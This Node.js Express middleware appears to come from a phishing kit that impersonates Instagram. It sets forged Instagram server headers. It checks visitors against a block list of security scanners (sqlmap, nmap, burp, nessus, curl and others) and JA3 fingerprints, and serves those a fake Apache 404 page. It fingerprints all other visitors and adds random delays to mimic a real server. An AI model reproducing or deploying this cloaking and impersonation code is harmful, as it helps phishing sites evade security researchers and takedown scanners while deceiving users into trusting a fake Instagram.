const crypto = require('crypto');

module.exports = function stealthMiddleware(req, res, next) {
    // Set fake Instagram headers
    res.setHeader('X-Instagram-Version', '259.0.0.10.109');
    res.setHeader('X-IG-Server', 'i.instagram.com');
    res.setHeader('X-FB-HTTP-Engine', 'Liger');
    res.setHeader('X-Pigeon-Session-Id', crypto.randomBytes(16).toString('hex'));
    res.setHeader('X-Pigeon-Rawclienttime', Date.now().toString());
    res.setHeader('X-IG-Connection-Type', 'WIFI');
    res.setHeader('X-IG-Capabilities', '3brTBw==');
    res.setHeader('X-IG-App-ID', '567067343352427');
    
    // Block security tools and scanners
    const blockedPatterns = [
        'scanner', 'crawler', 'burp', 'zap', 'nikto', 'sqlmap', 
        'nmap', 'metasploit', 'wpscan', 'dirbuster', 'gobuster',
        'arachni', 'acunetix', 'nessus', 'openvas', 'qualys',
        'wget', 'curl', 'python-requests', 'python-urllib',
        'ja3/s', 'recon-ng', 'theharvester', 'sublist3r'
    ];
    
    const userAgent = (req.headers['user-agent'] || '').toLowerCase();
    const ja3Hash = req.headers['ssl-ja3'] || '';
    
    // Check JA3 fingerprint (if available)
    const blockedJA3 = [
        '771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53', // Common scanner fingerprint
        '771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53-10'
    ];
    
    // Block if matches patterns
    if (blockedPatterns.some(pattern => userAgent.includes(pattern)) ||
        blockedJA3.includes(ja3Hash)) {
        
        // Return fake 404 to waste scanner time
        res.status(404);
        res.setHeader('Content-Type', 'text/html');
        return res.send(`
            <!DOCTYPE html>
            <html>
            <head><title>404 Not Found</title></head>
            <body>
                <h1>404 Not Found</h1>
                <p>The requested URL was not found on this server.</p>
                <hr>
                <address>Apache/2.4.41 (Ubuntu) Server at ${req.headers.host} Port 443</address>
            </body>
            </html>
        `);
    }
    
    // Generate browser fingerprint
    const fingerprintData = [
        req.headers['user-agent'],
        req.headers['accept-language'],
        req.headers['accept-encoding'],
        req.headers['accept'],
        req.headers['connection'],
        req.ip
    ].join('|');
    
    req.fingerprint = crypto
        .createHash('sha256')
        .update(fingerprintData)
        .digest('hex')
        .substring(0, 16);
    
    // Detect device type
    req.userAgent = {
        isMobile: /mobile|android|iphone|ipad|ipod/i.test(userAgent),
        isInstagram: /instagram/i.test(userAgent),
        isBot: /bot|crawler|spider/i.test(userAgent),
        isChrome: /chrome/i.test(userAgent),
        isFirefox: /firefox/i.test(userAgent)
    };
    
    // Add delay untuk mimic server response time
    const delay = Math.floor(Math.random() * 150) + 50; // 50-200ms
    setTimeout(next, delay);
};
